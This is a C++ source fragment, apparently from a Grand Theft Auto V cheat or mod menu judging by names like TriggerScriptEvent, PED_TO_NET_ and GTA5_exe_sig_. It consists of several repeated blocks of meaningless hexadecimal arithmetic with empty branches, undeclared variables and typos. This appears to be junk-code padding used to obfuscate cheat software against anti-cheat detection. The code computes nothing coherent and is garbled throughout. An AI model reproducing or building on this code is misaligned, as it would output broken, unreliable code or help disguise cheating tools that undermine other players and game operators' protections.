			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Dynamic>false</Dynamic>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
